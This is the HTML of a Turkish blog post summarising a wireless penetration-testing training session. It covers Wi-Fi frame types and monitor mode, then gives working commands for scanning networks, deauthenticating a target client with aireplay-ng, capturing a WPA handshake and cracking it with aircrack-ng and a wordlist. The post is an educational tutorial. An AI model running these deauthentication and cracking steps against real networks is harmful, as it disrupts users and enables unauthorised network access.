@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Kablosuz Ağ Güvenliği - Bölüm 1 - Bora Tanrıkulu</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="Kablosuz Ağ Güvenliği - Bölüm 1" />
+<meta property="og:description" content="hacktrick&#39;18 - kablosuz ağ sızma testleri eğitiminin bir özeti" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://boratanrikulu.dev/kablosuz-ag-guvenligi-bolum-1/" />
+<meta property="article:published_time" content="2018-05-26T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-05-26T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Kablosuz Ağ Güvenliği - Bölüm 1"/>
+<meta name="twitter:description" content="hacktrick&#39;18 - kablosuz ağ sızma testleri eğitiminin bir özeti"/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://boratanrikulu.dev/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://boratanrikulu.dev/css/main.css" /><link rel="stylesheet" type="text/css" href="https://boratanrikulu.dev/css/dark.css" media="(prefers-color-scheme: dark)" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://boratanrikulu.dev/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://boratanrikulu.dev/">
+				<img src="/images/avatar.jpeg" alt="Bora Tanrıkulu" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://boratanrikulu.dev/">Bora Tanrıkulu</a></h1>
+	<div class="site-description"><p>Interested in shell scripting, system administration and golang.</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/boratanrikulu/" title="Github"><i data-feather="github"></i></a></li><li><a href="https://twitter.com/boratanrikulu_/" title="Twitter"><i data-feather="twitter"></i></a></li><li><a href="https://linkedin.com/in/bora-tanrikulu/" title="LinkedIn"><i data-feather="linkedin"></i></a></li></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/aboutme">About me</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">26</span>
+							<span class="rest">May 2018</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">Kablosuz Ağ Güvenliği - Bölüm 1</h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<p><strong>Kaynaklar</strong><br>
+Hacktrick&rsquo;18 - Kablosuz Ağ Sızma Testleri - Besim Altınok</p>
+<hr>
+<h2 id="bazı-temel-bilgiler">Bazı Temel Bilgiler</h2>
+<p align="center"> 
+	<img src="/images/posts/kablosuz-ag-guvenligi-bolum-1/3.png">
+</p>
+<p>Modemler kendilerinin aktif olduğu belirtmek için etrafa <strong>Beacon</strong> paketleri yayarlar, bu sayede çevredeki aktif ağları görebiliriz.<br>
+Client modeme bağlanmak isterse, talep isteği olaran bir <strong>Probe Request</strong> paketi yollar.<br>
+Bu paketi alan modem <strong>Probe Response</strong> paketi ile cevap verir.<br>
+Eğer ağ şifreli ise <strong>Authentication Request</strong> ve <strong>Authentication Response</strong> aşamaları ile gerekli kontroller yapılmış olur.<br>
+<strong>Asociation Request</strong> ve <strong>Asociation Response</strong> aşamaları ile de bağlanma işlemi tamamlanır.</p>
+<ul>
+<li><strong>Beacon</strong> paketleri SSID, MAC adresi, Kanal numarası, Şifreleme tipi bilgilerini içerir.</li>
+<li><strong>Probe Request</strong> paketi sadece SSID içerir, MAC adresi içermez.</li>
+</ul>
+<hr>
+<h2 id="ağ-kartı-modları">Ağ Kartı Modları</h2>
+<p><strong>Managed Modu :</strong> Kablosuz ağa bağlanılabilir.</p>
+<p><strong>Master Modu :</strong> Erişim noktası hizmeti verebilir.</p>
+<p><strong>Monitor Modu :</strong> Herhangi bir erişim noktasına bağlanmadan ya da erişim noktası hizmeti vermeden direkt olarak havada uçan paketleri dinlenebilir.</p>
+<hr>
+<h2 id="ağ-kartının-yapılandırılması">Ağ Kartının Yapılandırılması</h2>
+<p>Ağ kartının şuanki durumunu gözlemlemek için aşağıdaki komut kullanılabilir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	iwconfig wlan0
+</code></pre></div><p>Ya da direkt <strong>iw</strong> ile de bilgi toplanabilir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	iw wlan0 info
+</code></pre></div><h4 id="monitor-modunu-aktifleştirmek">Monitor Modunu Aktifleştirmek</h4>
+<blockquote>
+<p><strong>NOT</strong><br>
+Monitor moduna geçmek için aşağıdaki işlemleri yapmak yerine <strong>airmon-ng</strong> kullanılabilir.<br>
+<code>airmon-ng start wlan0</code></p>
+</blockquote>
+<p>Monitor modunu aktifleştirmek için <strong>iwconfig</strong> kullanılabilir. Bunun için aşağıdaki adımları uygulamak gereklidir.</p>
+<p>İlk olarak ağ kartı <strong>down</strong> edilmelidir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	ifconfig wlan0 down
+</code></pre></div><p>Ardından modu, monitor olarak ayarlanmalıdır.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	iwconfig wlan0 mode monitor
+</code></pre></div><p>Son olarak ağ kartının <strong>up</strong> edilmesi gereklidir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	ifconfig wlan0 up
+</code></pre></div><p>Bu adımların ardından kartımızın monitor moduna geçtiğini görebiliriz.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	iwconfig wlan0
+</code></pre></div><h4 id="belli-bir-kanalda-monitor-modunu-aktifleştirmek">Belli Bir Kanalda Monitor Modunu Aktifleştirmek</h4>
+<p>Eğer ağ kartının belli bir kanalda monitor moduna geçirilmesi gerekiyorsa <strong>channel</strong> paremetresi kullanılır.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	iwconfig wlan0 channel 8
+</code></pre></div><hr>
+<h2 id="wireshark-ile-beacon-ve-probe-paketlerinin-incelenmesi">Wireshark ile Beacon ve Probe Paketlerinin İncelenmesi</h2>
+<p>Ağ kartımızı monitor moduna geçirdikten sonra etrafta uçan paketleri görmek için <strong>wlan0mon</strong> ile wireshark dinlemesini başlatabiliriz.</p>
+<p>Belli bir SSID&rsquo;i filtrelemek için wlan.ssid parametresini kullanabiliriz.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	wlan.ssid == &#34;networkName&#34;
+</code></pre></div><ul>
+<li>Eğer belirli bir paket tipini incelemek istiyorsak, aşağıdaki parametreler kullanılabilir.
+<ul>
+<li>Sadece Beacon paketlerini görmek için <strong>0x008</strong>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">    wlan.fc.type_subtype == 0x008
+</code></pre></div><div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div></li>
+<li>Sadece Probe Request paketlerini görmek için <strong>0x004</strong>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">    wlan.fc.type_subtype == 0x004
+</code></pre></div><div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"></code></pre></div></li>
+<li>Sadece Probe Response paketlerini görmek için <strong>0x005</strong>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">    wlan.fc.type_subtype == 0x005
+</code></pre></div><div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
+</code></pre></div></li>
+</ul>
+</li>
+</ul>
+<h4 id="ağın-şifreleme-türünü-wireshark-ile-tespit-etmek">Ağın Şifreleme Türünü WireShark ile Tespit Etmek</h4>
+<p>WireShark&rsquo;ta Beacon paketi incelenerek ağın şifreleme türü tespit edilebilir.</p>
+<p>Beacon Paketinin <strong>Capabilites</strong> altında bulunan <strong>Privacy</strong> kısmı eğer 1 ise ağ şifreli demektir.</p>
+<p align="center"> 
+	<img src="/images/posts/kablosuz-ag-guvenligi-bolum-1/1.png">
+</p>
+<p>Şifreleme tipini öğrenmek için <strong>RSN</strong> tag&rsquo;ine bakmak gerekir. Örneğin <strong>AES</strong> var ise WPA2 şifrelemesi vardır.</p>
+<p align="center"> 
+	<img src="/images/posts/kablosuz-ag-guvenligi-bolum-1/2.png">
+</p>
+<hr>
+<h2 id="çevredeki-ağların-tespit-edilmesi">Çevredeki Ağların Tespit edilmesi</h2>
+<blockquote>
+<p>Ağ kartı monitor moda alınmamış olsa bile direkt <em>airodump-ng wlan0</em> denilirse, cihaz monitor moda otomatik olarak geçirilir.</p>
+</blockquote>
+<p>Airodump-ng ile aşağıdaki bilgileri elde edilebilir.</p>
+<ul>
+<li>Kablosuz ağın ismi</li>
+<li>Kablosuz ağın MAC adres bilgisi</li>
+<li>Yayın yapılan kanal numarası</li>
+<li>Şifreleme algoritması</li>
+<li>Kablosuz ağlara bağlı istemcileri</li>
+<li>İstemcilerin yolladığı probe isteklerinden kablosuz ağ isimleri</li>
+</ul>
+<p>Kullanılabilir parametreler aşağıdaki gibidir.</p>
+<table>
+<thead>
+<tr>
+<th align="center">Parametre</th>
+<th align="center">Açıklama</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">&ndash;manufacturer</td>
+<td align="center">Cihazın üretici firmasını tespit etmek için</td>
+</tr>
+<tr>
+<td align="center">&ndash;uptime</td>
+<td align="center">Erişim noktasının aktif olduğu süreyi görmek için</td>
+</tr>
+<tr>
+<td align="center">-f [zaman]</td>
+<td align="center">Belli aralıklar ile kanal değiştirmek için</td>
+</tr>
+<tr>
+<td align="center">-w [file]</td>
+<td align="center">Yakalanan paketleri kaydetmek için</td>
+</tr>
+<tr>
+<td align="center">&ndash;output-format</td>
+<td align="center">Belli bir formatta kaydetmek için (pcap, ivs, csv, gps, kismet, netxml)</td>
+</tr>
+</tbody>
+</table>
+<p>Kullanılabilir filtreler aşağıdaki gibidir.</p>
+<table>
+<thead>
+<tr>
+<th align="center">Filtre</th>
+<th align="center">Açıklama</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="center">&ndash;wps</td>
+<td align="center">WPS korumalı ağları listeler.</td>
+</tr>
+<tr>
+<td align="center">&ndash;encrypt [encrypt]</td>
+<td align="center">Şifreleme tipine göre bilgi toplamamızı sağlar.</td>
+</tr>
+<tr>
+<td align="center">&ndash;bssid [bssid]</td>
+<td align="center">Belirli bir erişim noktası için bilgi toplar.</td>
+</tr>
+<tr>
+<td align="center">&ndash;essid [essid]</td>
+<td align="center">Kablosuz ağ ismine göre bilgi toplar.</td>
+</tr>
+<tr>
+<td align="center">&ndash;channel [channel]</td>
+<td align="center">Belirli bir kanal numarasına göre bilgi toplar.</td>
+</tr>
+<tr>
+<td align="center">&ndash;essid-regex [regex]</td>
+<td align="center">Belirli bir kelime içeren ağları tespit için</td>
+</tr>
+<tr>
+<td align="center">&ndash;essid-regex &lsquo;(?i)^regex&rsquo;</td>
+<td align="center">Belirli bir kelime içeren ama küçük/büyük harf fark etmeyen ağları tespit etmek için</td>
+</tr>
+</tbody>
+</table>
+<p>Çevredeki ağlar aşağıdaki gibi tespit edilebilir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	airodump-ng wlan0mon --manufacturer --uptime
+</code></pre></div><p>Belirli bir ağın dinlenmesi ve cap uzantılı bir dosyaya kaydedilmesine aşağıdaki komut örnek verilebilir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	airodump-ng wlan0mon --bssid A6:EB:1C:26:3C:EA --channel 3 -w outputFile --output-format cap
+</code></pre></div><h5 id="iwlist-ile-ağların-tespiti">iwlist ile Ağların Tespiti</h5>
+<p>UNIX tabanlı sistemlerde <strong>iwlist</strong> tool&rsquo;u ile çevredeki ağlar hakkında bilgi toplanabilir.<br>
+Örneğin aşağıdaki komut ile, çevredeki ağların ESSID değerleri elde edilebilir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	iwlist wlan0 scanning | grep -i &#34;ESSID&#34;
+</code></pre></div><p>Windows sistemlerde ise <a href="http://www.oxid.it/">exid.it</a> ile monitor moduna geçmeden dinleme yapılabilir.</p>
+<hr>
+<h2 id="gizli-ağların-tespiti">Gizli Ağların Tespiti</h2>
+<p>Çevrede bulunan gizli ağların tespiti için ağ dinlemeye alınır eğer biri ağa bağlanır ise isim tespit edilmiş olur. İstemciler ağdan düşürülerek ağa tekrar bağlanması sağlanabilir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	airodump-ng wlan0mon --bssid A6:EB:1C:26:3C:EA -c 6
+</code></pre></div><hr>
+<h2 id="istemcilerin-ağdan-düşürülmesi">İstemcilerin Ağdan Düşürülmesi</h2>
+<p>İstemcileri bağlı oldukları ağdan düşürmek için; modeme, hedef istemcinin ağdan ayrılmak istediğini belirten, <strong>Deauthentication</strong> paketleri yollanabilir.<br>
+Deauthentication paketleri modemin ve bağlantısını koparmak isteyen istemcinin MAC adresini içerir.</p>
+<p>Bunun için <strong>aireplay-ng</strong> tool&rsquo;u kullanılabilir. Genel kullanım aşağıdaki gibidir.<br>
+<strong>-a</strong> parametresinde modemin, <strong>-c</strong> parametresinde de hedef istemcinin MAC adresi girilir.<br>
+<strong>&ndash;deauth</strong> parametresi ile gönderilecek deauth paketi sayısı belirlenir, eğer 0 girilirse sonsuza kadar paket yollanır.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	aireplay-ng --deauth 3 -a A6:EB:1C:26:3C:EA -c 5E:9F:F5:19:FC:2A wlan0mon
+</code></pre></div><hr>
+<h2 id="handshake-saldırısı-ile-ağ-parolalarının-ele-geçirilmesi">Handshake Saldırısı ile Ağ Parolalarının Ele Geçirilmesi</h2>
+<p>WPA/WPA2 tipi şifrelemeye sahip ağlarda, parola ele geçilirmesi için handshake saldırı yönetimi kullanılabilir.<br>
+Bu saldırı yönteminde hedef ağ dinlemeye alınır ve istemcilerden birinin ağdan düşürülmesi ve ardından tekrar bağlanması ile bir handshake yakalanmaya çalışılır. Handshake paketleri elde edildikten sonra aircrack-ng tool&rsquo;u ile dictionary saldırısı ile parola tespiti sağlanmaya çalışılır.</p>
+<p>İlk olarak hedef ağın MAC adresini tespit etmek amaçlı çevredeki ağlar dinlenir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	airodump-ng wlan0mon --manufacturer --uptime
+</code></pre></div><p>Saldırılacak ağın MAC adresi alındıktan sonra aşağıdaki gibi bir dinleme başlatılır ve bu dinleme işlemi cap uzantılı bir dosyaya kayıt edilir. Eğer cap uzantılı dosya Wireshark&rsquo;ta incelenir ise <strong>eapol</strong> filtresi ile handshake paketleri(her handshake 4 paketten oluşur) görülebilir.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	airodump-ng wlan0mon --bssid A6:EB:1C:26:3C:EA --channel 3 -w outputFile --output-format cap
+</code></pre></div><p>Ardından bir handshake yakalamak amacıyla ağda bulunan istemcilerden biri ağdan düşürülür ve tekrar bağlanması beklenir. Eğer istemci ağa tekrar bağlanır ise handshake paketleri elde edilmiş olur.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	aireplay-ng --deauth 3 -a A6:EB:1C:26:3C:EA -c 5E:9F:F5:19:FC:2A wlan0mon
+</code></pre></div><p>Handshake elde ediltikten sonra dinleme işlemi durdurulur ve dictionary saldırısı başlatılır. Dictionary saldırılarında kritik olan nokta sözlüğün hedefe göre hazırlanmasıdır.</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">	aircrack-ng -w ~/Documents/rockyou.txt -b A6:EB:1C:26:3C:EA outputFile.cap -0
+</code></pre></div>
+			</div>
+
+			<div class="tags">
+				
+					
+						<ul class="flat">
+							
+							<li><a href="/tags/security">Security</a></li>
+							
+						</ul>
+					
+				
+			</div><div id="disqus_thread"></div>
+<script type="text/javascript">
+	(function () {
+		
+		
+		if (window.location.hostname == "localhost")
+			return;
+
+		var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+		var disqus_shortname = 'boratanrikulu';
+		dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	})();
+</script>
+<noscript>Please enable JavaScript to view the </a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-77508691-3', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
